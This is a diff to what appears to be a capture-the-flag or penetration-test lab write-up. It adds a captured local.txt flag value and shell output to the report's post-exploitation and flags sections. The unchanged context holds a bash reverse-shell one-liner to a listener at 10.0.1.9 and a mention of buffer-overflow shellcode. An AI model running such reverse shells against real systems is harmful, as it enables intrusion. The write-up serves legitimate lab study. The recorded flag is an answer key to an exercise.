@@ -147,10 +147,11 @@ bash -c 'bash -i >& /dev/tcp/10.0.1.9/443 0>&1'
 ## 5. Post-exploitation — local.txt
 
 ```bash
-cat /home/fox/local.txt
+www-data@school:/home/fox$ cat /home/fox/local.txt
+e4ed03b4852906b6cb716fc6ce0f9fd5
 ```
 
-> **LOCAL.TXT — 7 PTS** → flag obtained ✓ (local PDF)
+> **LOCAL.TXT — 7 PTS** → flag obtained ✓
 
 ## 6. Privilege escalation (partial)
 
@@ -228,9 +229,9 @@ payload += shellcode                    # linux/x86 reverse shell
 
 ## 7. Flags
 
-| Flag       | Points | Location              | Status                                                            |
+| Flag       | Points | Location              | Value / Status                                                    |
 |------------|--------|-----------------------|-------------------------------------------------------------------|
-| local.txt  | 7 pts  | `/home/fox/local.txt` | OBTAINED ✓                                                        |
+| local.txt  | 7 pts  | `/home/fox/local.txt` | `e4ed03b4852906b6cb716fc6ce0f9fd5` ✓                              |
 | proof.txt  | 4 pts  | `/root/proof.txt`     | PENDING (BOF confirms EIP overwrite, shellcode without callback)  |
 
 | Credential                          | Value    | Source               |
